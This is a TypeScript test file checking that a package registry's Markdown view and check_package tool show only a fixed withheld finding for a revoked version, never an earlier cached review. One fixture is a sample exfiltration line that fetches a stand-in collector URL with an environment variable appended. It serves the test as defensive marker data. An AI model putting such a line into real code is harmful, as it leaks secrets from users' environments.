// Review finding (P1, AI finding sentences): the Markdown view and check_package cut a withheld version's excerpts but
// kept each finding's sentence, which the model wrote about the package's code and can quote it. The registry now sends
// a withheld version's findings with a fixed sentence and each file by reference; these views must show exactly that,
// and never a review read before the revoke. Here the registry is a stub behind fetch, read through the real
// registrySource, so nothing the site caches can stand in for the registry's answer.
import { afterAll, beforeAll, describe, expect, mock, test } from "bun:test";
import { REGISTRY } from "../registry-url";
import type { ReviewAnswer } from "../review-schema";
import { pkg, REVIEW_CLEAN } from "./testing";

// registry-source.ts is server code; outside Next.js the "server-only" guard would refuse the import
void mock.module("server-only", () => ({}));

const { registrySource } = await import("./registry-source");
const { handleMessage } = await import("./mcp");
const { markdownResponse } = await import("./agent-http");

/** The registry's WITHHELD_ISSUE (packages/registry/src/withheld.ts); the Miniflare revoke test checks the real one. */
const WITHHELD_ISSUE = "Finding withheld with this version";

const NAME = "withheld-pkg";
const VERSION = "1.0.0";
const VERSION_PATH = `-/apm/v1/packages/${NAME}/versions/${VERSION}`;
const REVIEW_PATH = `-/apm/v1/review/${NAME}/${VERSION}`;

type Answer = { status: number; body: unknown };

/** Answers by path; a list is answered in order, its last entry from then on. */
const answers = new Map<string, Answer | Answer[]>();
const asked: string[] = [];
const realFetch = globalThis.fetch;

function stubFetch(input: string | URL | Request): Promise<Response> {
  const url = new URL(input instanceof Request ? input.url : input.toString());
  const key = url.pathname.replace(/^\/+/, "");

  asked.push(key);
  const a = answers.get(key);
  const next = Array.isArray(a) ? (a.length > 1 ? a.shift() : a[0]) : a;

  return Promise.resolve(next ? Response.json(next.body, { status: next.status }) : Response.json({ error: "Not found" }, { status: 404 }));
}

beforeAll(() => {
  globalThis.fetch = Object.assign(stubFetch, { preconnect: realFetch.preconnect });
});

afterAll(() => {
  globalThis.fetch = realFetch;
});

const clean = REVIEW_CLEAN.review;

if (!clean) throw new Error("REVIEW_CLEAN has a review");

/** Text the model wrote about the package's code before the revoke, and the path it named: neither may outlive it. */
const EARLIER_ISSUE = "Posts EARLIER-ISSUE-TEXT to a collector on import";
const EARLIER_FILE = "lib/EARLIER-FILE-NAME.js";
const EARLIER_EXCERPT = "fetch('https://collector.example/' + process.env.EARLIER_EXCERPT)";

const shownReview = (): Answer => ({
  status: 200,
  body: {
    ...REVIEW_CLEAN,
    name: NAME,
    version: VERSION,
    versionStatus: "active",
    redacted: false,
    review: { ...clean, state: "confirmed", findings: [{ file: EARLIER_FILE, line: 2, excerpt: EARLIER_EXCERPT, issue: EARLIER_ISSUE, severity: "high" }] },
  } satisfies ReviewAnswer,
});

/** The registry's findings for the withheld version, exactly as review.ts sends them. */
const WITHHELD_FINDINGS = [{ file: "file 1", line: 2, excerpt: "", issue: WITHHELD_ISSUE, severity: "high" }] as const;

const withheldReview = (): Answer => ({
  status: 200,
  body: { ...REVIEW_CLEAN, name: NAME, version: VERSION, versionStatus: "revoked", redacted: true, review: { ...clean, state: "confirmed", read: ["file 1"], findings: [...WITHHELD_FINDINGS] } } satisfies ReviewAnswer,
});

const versionAnswer = (status: "active" | "revoked", deprecated: string | null): Answer => ({
  status: 200,
  body: { name: NAME, version: VERSION, status, statusReason: status === "revoked" ? "steals tokens" : null, deprecated, facts: null, score: null },
});

function setPackage(): void {
  const p = pkg({ name: NAME, latest: VERSION, distTags: { latest: VERSION }, versions: [{ version: VERSION, publishedAt: "2026-01-01T00:00:00.000Z", publishedBy: "someone", status: "active", statusReason: null, deprecated: null, score: 75, grade: "B" }] });

  answers.set(`-/apm/v1/packages/${NAME}`, { status: 200, body: p });
}

type Checked = { text: string; structured: unknown; isError: boolean };

async function checkPackage(): Promise<Checked> {
  const answer = await handleMessage({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "check_package", arguments: { name: NAME, version: VERSION } } }, registrySource);
  const result = answer?.result && "content" in answer.result ? answer.result : null;

  return { text: result?.content[0]?.text ?? "", structured: result?.structuredContent ?? null, isError: result?.isError === true };
}

async function markdown(): Promise<{ status: number; text: string }> {
  const res = await markdownResponse({ name: NAME, version: VERSION, registry: REGISTRY, source: registrySource });

  return { status: res.status, text: await res.text() };
}

const EARLIER = [EARLIER_ISSUE, "EARLIER-ISSUE-TEXT", EARLIER_FILE, "EARLIER-FILE-NAME", "EARLIER_EXCERPT", "LEAK-DEPRECATION"];

function expectNothingEarlier(...texts: string[]): void {
  for (const t of texts) for (const e of EARLIER) expect(t, e).not.toContain(e);
}

const FINDING_LINE = `Finding 1 (high) at \`file 1:2\`: \`${WITHHELD_ISSUE}\``;

describe("a withheld version's AI review in the agent views is exactly the registry's", () => {
  test("warmed while shown, then revoked: the Markdown view and both check_package formats show only what the registry now sends", async () => {
    setPackage();
    answers.set(VERSION_PATH, versionAnswer("active", "LEAK-DEPRECATION shown while active"));
    answers.set(REVIEW_PATH, shownReview());
    // while it is shown, the views quote the finding: the checks below would see it kept
    expect((await checkPackage()).text).toContain(EARLIER_ISSUE);
    expect((await markdown()).text).toContain(EARLIER_FILE);

    // revoked; the version answer still carrying a deprecation message stands for a registry that forgot to drop it
    answers.set(VERSION_PATH, versionAnswer("revoked", "LEAK-DEPRECATION"));
    answers.set(REVIEW_PATH, withheldReview());
    asked.length = 0;
    const tool = await checkPackage();
    const md = await markdown();

    // asked of the registry for each view, nothing from a cache
    expect(asked.filter((p) => p === REVIEW_PATH).length).toBe(2);
    expect(tool.isError).toBe(false);
    expect(md.status).toBe(200);
    expect(tool.text).toBe(md.text);
    expect(md.text).toContain(FINDING_LINE);
    expect(md.text).toContain("- Status: revoked, reason `steals tokens`.");
    expect(tool.structured).toMatchObject({ status: { status: "revoked", deprecated: null }, aiReview: { findings: WITHHELD_FINDINGS } });
    expectNothingEarlier(tool.text, JSON.stringify(tool.structured), md.text);
  });

  test("a revoke between the version read and the review read: both are read again, and the earlier review is never shown", async () => {
    setPackage();
    answers.set(VERSION_PATH, versionAnswer("revoked", null));
    // the first review read is from before the revoke, the next from after it
    answers.set(REVIEW_PATH, [shownReview(), withheldReview(), shownReview(), withheldReview()]);
    asked.length = 0;
    const tool = await checkPackage();
    const md = await markdown();

    expect(asked.filter((p) => p === REVIEW_PATH).length).toBe(4);
    expect(asked.filter((p) => p === VERSION_PATH).length).toBe(4);
    expect(md.text).toContain(FINDING_LINE);
    expect(tool.structured).toMatchObject({ aiReview: { findings: WITHHELD_FINDINGS } });
    expectNothingEarlier(tool.text, JSON.stringify(tool.structured), md.text);
  });

  test("the review is withheld but the version read was from before the revoke: read again, and its deprecation is not shown", async () => {
    setPackage();
    answers.set(VERSION_PATH, [versionAnswer("active", "LEAK-DEPRECATION"), versionAnswer("revoked", null)]);
    answers.set(REVIEW_PATH, withheldReview());
    const tool = await checkPackage();

    expect(tool.structured).toMatchObject({ status: { status: "revoked", deprecated: null }, aiReview: { findings: WITHHELD_FINDINGS } });
    expectNothingEarlier(tool.text, JSON.stringify(tool.structured));
  });

  test("answers that still disagree after the second read: no view, rather than the earlier review", async () => {
    setPackage();
    answers.set(VERSION_PATH, versionAnswer("revoked", null));
    answers.set(REVIEW_PATH, shownReview());
    const tool = await checkPackage();
    const md = await markdown();

    expect(tool.isError).toBe(true);
    expect(tool.text).toBe(`The registry did not answer while reading ${NAME}. Nothing was checked; try again.`);
    expect(md.status).toBe(503);
    expectNothingEarlier(tool.text, JSON.stringify(tool.structured), md.text);
  });
});
